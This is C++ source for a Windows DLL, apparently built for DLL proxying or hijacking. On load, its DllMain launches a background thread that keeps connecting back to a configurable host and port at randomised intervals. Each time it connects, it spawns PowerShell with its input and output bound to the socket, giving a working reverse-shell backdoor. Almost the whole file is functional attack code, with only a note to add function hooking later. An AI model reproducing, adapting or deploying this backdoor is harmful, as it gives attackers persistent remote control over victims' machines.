/*

https://itm4n.github.io/dll-proxying/
https://www.codeproject.com/Articles/17863/Using-Pragmas-to-Create-a-Proxy-DLL

to implement: hooking specific functions

*/

#include "definitions.h"
#include <thread>
#include <chrono>
#include <random>
extern "C" {
    #include <stdlib.h>
    #include <winsock2.h>
    #include <stdio.h>
    #include <windows.h>
    #include <ws2tcpip.h>
}
using namespace std;
#pragma comment(lib,"Ws2_32.lib")

#define HOST "127.0.0.1"
#define PORT 8082
#define SPAWN_SHELL "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

string resolve_domain(const char *domain) {
    char ipstr[INET6_ADDRSTRLEN] = {0};
    addrinfo hints = { 0 }, * res = { 0 };
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    if (getaddrinfo(domain, NULL, &hints, &res) == 0) {

        void* addr;
        if (res->ai_family == AF_INET)
        {
            // IPV4
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
            addr = &(ipv4->sin_addr);
        }
        else
        {
            struct sockaddr_in6* ipv6 = (struct sockaddr_in6*)res->ai_addr;
            addr = &(ipv6->sin6_addr);
        }
        inet_ntop(res->ai_family, addr, ipstr, sizeof(ipstr));
    }
    freeaddrinfo(res);
    return string(ipstr, strlen(ipstr));
}

void spawn_backconnect(void){
    string ip = resolve_domain(HOST);
    if (!ip.empty()) {
        SOCKET s0 = { 0 };
        sockaddr_in addr = { 0 };
        WSADATA version = { 0 };
        if (WSAStartup(MAKEWORD(2, 2), &version) == 0) {
            s0 = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
            addr.sin_family = AF_INET;
            InetPton(AF_INET, ip.c_str(), &addr.sin_addr.s_addr);
            addr.sin_port = htons(PORT);
            if (WSAConnect(s0, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
                goto clean_up;
            }
            else {
                if (send(s0, "\0", 1, 0) <= 0) {
                    goto clean_up;
                }
                else {
                    STARTUPINFO sinfo = { 0 };
                    PROCESS_INFORMATION pinfo = { 0 };
                    sinfo.cb = sizeof(sinfo);
                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)s0;
                    CreateProcess(NULL, (LPSTR)SPAWN_SHELL, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                    WaitForSingleObject(pinfo.hProcess, INFINITE);
                    CloseHandle(pinfo.hProcess);
                    CloseHandle(pinfo.hThread);
                }
            }
        }
    clean_up:
        closesocket(s0);
        WSACleanup();
    }
}

void handle_backconnect(void) {
    while (true) {
        thread door(spawn_backconnect);
        door.detach();
        this_thread::sleep_for(chrono::seconds(rand() % 40 + 30));
    }
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved)  // reserved
{
    srand(time(NULL));
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
        {
            thread door(handle_backconnect);
            door.detach();
            break;
        }
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
        default:
            break;
    }
    return true;  // Successful DLL_PROCESS_ATTACH.
}
